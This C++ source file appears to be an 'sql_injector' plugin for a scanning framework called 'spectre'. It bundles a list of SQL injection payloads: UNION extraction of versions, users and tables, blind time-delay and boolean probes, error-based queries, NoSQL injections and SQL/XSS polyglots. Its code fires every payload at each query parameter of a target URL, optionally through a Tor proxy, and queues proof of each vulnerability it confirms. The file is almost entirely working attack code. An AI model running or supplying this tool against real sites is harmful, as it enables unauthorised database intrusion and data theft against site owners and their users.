#include "spectre/plugin.h"
#include "spectre/proof_queue.h"
#include "spectre/tor_proxy.h"
#include <cpr/cpr.h>
#include <nlohmann/json.hpp>
#include <iostream>
#include <vector>
#include <string>
#include <chrono>
#include <regex>
#include <uriparser/Uri.h>

namespace {

class SQLInjector : public spectre::Plugin {
private:
    struct SQLPayload {
        std::string payload;
        std::string description;
        std::string technique;
        bool blind;
        int delay_seconds;
    };

    std::vector<SQLPayload> payloads = {
        {"' UNION SELECT null,version(),null--", "Version extraction via UNION", "union", false, 0},
        {"' UNION SELECT 1,user(),3--", "User extraction via UNION", "union", false, 0},
        {"' UNION SELECT table_name,null,null FROM information_schema.tables--", "Table enumeration", "union", false, 0},
        
        {"' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", "Schema existence check", "boolean_blind", true, 0},
        {"' AND (SELECT SUBSTRING(version(),1,1))='5'--", "Version fingerprinting", "boolean_blind", true, 0},
        {"' AND (SELECT LENGTH(database()))>0--", "Database name length probe", "boolean_blind", true, 0},
        
        {"'; WAITFOR DELAY '00:00:05'--", "SQL Server time delay", "time_blind", true, 5},
        {"' AND (SELECT SLEEP(5))--", "MySQL time delay", "time_blind", true, 5},
        {"' AND (SELECT pg_sleep(5))--", "PostgreSQL time delay", "time_blind", true, 5},
        {"'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", "Conditional time delay", "time_blind", true, 5},
        
        {"' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--", "MySQL error extraction", "error_based", false, 0},
        {"' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "MySQL double query error", "error_based", false, 0},
        
        {"'; return true; var x='", "MongoDB JavaScript injection", "nosql", false, 0},
        {"' || '1'=='1", "NoSQL boolean manipulation", "nosql", false, 0},
        
        {"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>", "SQL+XSS polyglot", "polyglot", false, 0},
        {"' AND '1'='1' UNION SELECT '<script>alert(1)</script>',null--", "SQL+XSS UNION polyglot", "polyglot", false, 0},
        
        {"' AND (SELECT * FROM (SELECT(SLEEP(5)))a UNION SELECT * FROM (SELECT(SLEEP(5)))b)--", "Double nested time delay", "advanced_time", true, 5},
        {"' AND IF((ASCII(SUBSTRING((SELECT version()),1,1))>52),SLEEP(5),0)--", "Conditional binary search", "binary_search", true, 5}
    };

    std::vector<std::string> error_signatures = {
        "SQL syntax.*MySQL",
        "Warning.*mysql_",
        "MySQLSyntaxErrorException",
        "valid MySQL result",
        "PostgreSQL.*ERROR",
        "Warning.*pg_",
        "valid PostgreSQL result",
        "ORA-[0-9][0-9][0-9][0-9]",
        "Oracle error",
        "Oracle.*Driver",
        "SQLServer JDBC Driver",
        "SqlException",
        "SQLite/JDBCDriver",
        "SQLite.Exception",
        "System.Data.SQLite.SQLiteException",
        "Warning.*sqlite_",
        "Microsoft.*ODBC.*SQL Server.*Driver",
        "\\[SQL Server\\]",
        "ODBC SQL Server Driver",
        "ODBC Driver.*for SQL Server",
        "SQLServer JDBC Driver",
        "com.jnetdirect.jsql",
        "macromedia.jdbc.sqlserver",
        "Zend.Db.(Adapter|Statement)",
        "Pdo.*(mysql|pgsql|oci):",
        "PDOException"
    };

    bool is_error_response(const std::string& response) {
        for (const auto& sig : error_signatures) {
            if (std::regex_search(response, std::regex(sig, std::regex_constants::icase))) {
                return true;
            }
        }
        return false;
    }

public:
    std::string name() const override { return "sql_injector"; }

    void handle_task(const spectre::Task& task) override {
        if (task.data.value("type", "") != name()) {
            return;
        }

        std::string url = task.data.value("target", "");
        if (url.empty()) {
            return;
        }

        std::cout << "[sql_injector] scanning " << url << std::endl;

        UriUriA uri;
        if (uriParseSingleUriA(&uri, url.c_str(), nullptr) != URI_SUCCESS) {
            return;
        }

        if (uri.query.first) {
            UriQueryListA* query_list;
            int item_count;
            if (uriDissectQueryMallocA(&query_list, &item_count, uri.query.first, uri.query.afterLast) == URI_SUCCESS) {
                for (int i = 0; i < item_count; ++i) {
                    std::string param_name = query_list->key;
                    for (const auto& payload : payloads) {
                        test_payload(url, param_name, payload);
                    }
                    query_list = query_list->next;
                }
                uriFreeQueryListA(query_list);
            }
        }
        uriFreeUriMembersA(&uri);
    }
private:
    void test_payload(const std::string& base_url, const std::string& param, const SQLPayload& payload) {
        std::string malicious_url = base_url;
        std::regex param_regex(param + "=[^&]*");
        malicious_url = std::regex_replace(malicious_url, param_regex, param + "=" + payload.payload);

        cpr::Session session;
        session.SetUrl(cpr::Url{malicious_url});
        session.SetTimeout(cpr::Timeout{10000 + (payload.delay_seconds * 1000)}); // Add delay for time-based
        if (spectre::TorProxy::get_instance().is_available()) {
            session.SetProxies({{"http", "socks5://127.0.0.1:9050"},
                                {"https", "socks5://127.0.0.1:9050"}});
        }
        
        auto start_time = std::chrono::steady_clock::now();
        cpr::Response r = session.Get();
        auto end_time = std::chrono::steady_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::seconds>(end_time - start_time).count();

        bool is_vulnerable = false;
        std::string reason;

        if (is_error_response(r.text)) {
            is_vulnerable = true;
            reason = "SQL error signature found in response.";
        } else if (payload.blind && duration >= payload.delay_seconds) {
            is_vulnerable = true;
            reason = "Time-based blind SQL injection detected.";
        }

        if (is_vulnerable) {
            std::cout << "[sql_injector] VULNERABILITY DISCOVERED" << std::endl;
            std::cout << "  -> Target: " << base_url << std::endl;
            std::cout << "  -> Parameter: " << param << std::endl;
            std::cout << "  -> Technique: " << payload.technique << std::endl;
            submit_proof(base_url, param, payload, reason, malicious_url);
        }
    }

    void submit_proof(const std::string& target, const std::string& param, const SQLPayload& payload, const std::string& reason, const std::string& vulnerable_url) {
        nlohmann::json evidence;
        evidence["description"] = "A SQL Injection vulnerability was discovered.";
        evidence["parameter"] = param;
        evidence["technique"] = payload.technique;
        evidence["payload"] = payload.payload;
        evidence["reason"] = reason;
        evidence["vulnerable_url"] = vulnerable_url;

        spectre::VulnProof proof = {
            target,
            "SQLI",
            evidence,
            std::to_string(std::time(nullptr)),
            ""
        };
        spectre::enqueue_proof(proof);
        std::cout << "[sql_injector] proof queued" << std::endl;
    }
};

} // namespace

extern "C" spectre::Plugin* spectre_create_plugin() {
    return new SQLInjector();
} 